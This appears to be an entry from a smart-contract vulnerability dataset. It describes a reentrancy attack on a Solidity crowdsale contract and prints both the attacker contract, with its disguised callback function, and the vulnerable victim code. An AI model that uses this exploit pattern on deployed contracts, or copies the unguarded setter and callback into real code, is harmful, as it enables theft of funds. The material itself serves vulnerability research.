# Attack03

### Contract Name:

Reservation (test3728.sol)

### Contract Address:



### Transaction Count:



### Involved Ethers:



### Length of the Call Chain: 

1 internal function, 1 external function

### Victim Function:

`eT(address,uint256,uint256)`

### Attack Mechanism:

Attack code:

```javascript
contract Attack is UacCrowdsale{
    CrowdsaleBase c = new CrowdsaleBase();
    constructor() payable {}
    function prepare() {
        c.setCrowdsale(this);
    }
    function mintReservationTokens(address to, uint256 amount) public {   // Disguised attack function
        //victim.call.value(1 eth)(bytes4(keccak256("contribution(uint256)")), 10);
        c.releaseTokensTo(this);
    }
    function() payable {

    }
    function getvalue() returns (uint) {
        return this.balance;
    }
}
contract UacCrowdsale {}

```

Attacked code:

```javascript
contract CrowdsaleBase {
    ...
    function releaseTokensTo(address buyer) internal returns(bool) {
        require(validPurchase());

        uint256 overflowTokens;
        uint256 refundWeiAmount;

        uint256 weiAmount = msg.value;
        uint256 tokenAmount = weiAmount.mul(price());

        if (tokenAmount >= availableTokens) {
            capReached = true;
            overflowTokens = tokenAmount.sub(availableTokens);
            tokenAmount = tokenAmount.sub(overflowTokens);
            refundWeiAmount = overflowTokens.div(price());
            weiAmount = weiAmount.sub(refundWeiAmount);
            buyer.transfer(refundWeiAmount);
        }

        weiRaised = weiRaised.add(weiAmount);
        tokensSold = tokensSold.add(tokenAmount);
        availableTokens = availableTokens.sub(tokenAmount);
        mintTokens(buyer, tokenAmount);
        forwardFunds(weiAmount);

        return true;
    }
    ...
    function mintTokens(address to, uint256 amount) private {
        crowdsale.mintReservationTokens(to, amount);
    }
    function setCrowdsale(address _crowdsale) public {
        require(crowdsale == address(0));
        crowdsale = UacCrowdsale(_crowdsale);
    }
    ...
}
```
In this case, the goal of our reentrancy is `crowdsale.mintReservationTokens(to, amount)` Attacker  can taint `crowdsale` then `releaseTokensTo` funciton is vulnerable because it call `mintTokens` which is a tainted function can call back!

**Attack.** The attacker call `prepare()` to taint `crowdsale` then call `mintReservationTokens` to attack victim.